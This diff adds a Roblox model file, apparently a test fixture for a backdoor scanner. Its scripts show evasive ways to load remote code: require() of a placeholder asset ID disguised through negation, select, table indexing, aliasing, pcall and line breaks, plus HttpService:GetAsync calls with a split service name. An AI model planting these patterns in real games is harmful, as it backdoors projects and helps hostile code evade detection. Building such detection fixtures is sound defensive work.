@@ -1,0 +1,80 @@
+<roblox version="4">
+  <Item class="Model" referent="RBX0">
+    <Properties>
+      <string name="Name">Evasive</string>
+    </Properties>
+    <Item class="Script" referent="RBX1">
+      <Properties>
+        <string name="Name">NegNeg</string>
+        <ProtectedString name="Source"><![CDATA[require(-(-4201337000))]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX2">
+      <Properties>
+        <string name="Name">Select</string>
+        <ProtectedString name="Source"><![CDATA[require(select(1, 4201337000))]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX3">
+      <Properties>
+        <string name="Name">TableIndex</string>
+        <ProtectedString name="Source"><![CDATA[require(({4201337000})[1])]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX4">
+      <Properties>
+        <string name="Name">ParenRequire</string>
+        <ProtectedString name="Source"><![CDATA[(require)(4201337000)]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX5">
+      <Properties>
+        <string name="Name">TableAlias</string>
+        <ProtectedString name="Source"><![CDATA[local t = {require}
+t[1](4201337000)]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX6">
+      <Properties>
+        <string name="Name">MultiLine</string>
+        <ProtectedString name="Source"><![CDATA[require(
+	4201337000
+)]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX7">
+      <Properties>
+        <string name="Name">NewlineCall</string>
+        <ProtectedString name="Source"><![CDATA[require
+(4201337000)]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX8">
+      <Properties>
+        <string name="Name">NumberVariable</string>
+        <ProtectedString name="Source"><![CDATA[local id = 4201337000
+require(id)]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX9">
+      <Properties>
+        <string name="Name">PcallRequire</string>
+        <ProtectedString name="Source"><![CDATA[pcall(require, 4201337000)]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX10">
+      <Properties>
+        <string name="Name">SplitService</string>
+        <ProtectedString name="Source"><![CDATA[local HS = game:GetService("Http".."Service")
+local code = HS:GetAsync(url)]]></ProtectedString>
+      </Properties>
+    </Item>
+    <Item class="Script" referent="RBX11">
+      <Properties>
+        <string name="Name">PcallGetAsync</string>
+        <ProtectedString name="Source"><![CDATA[local HS = game:GetService("HttpService")
+local ok, code = pcall(HS.GetAsync, HS, url)]]></ProtectedString>
+      </Properties>
+    </Item>
+  </Item>
+</roblox>
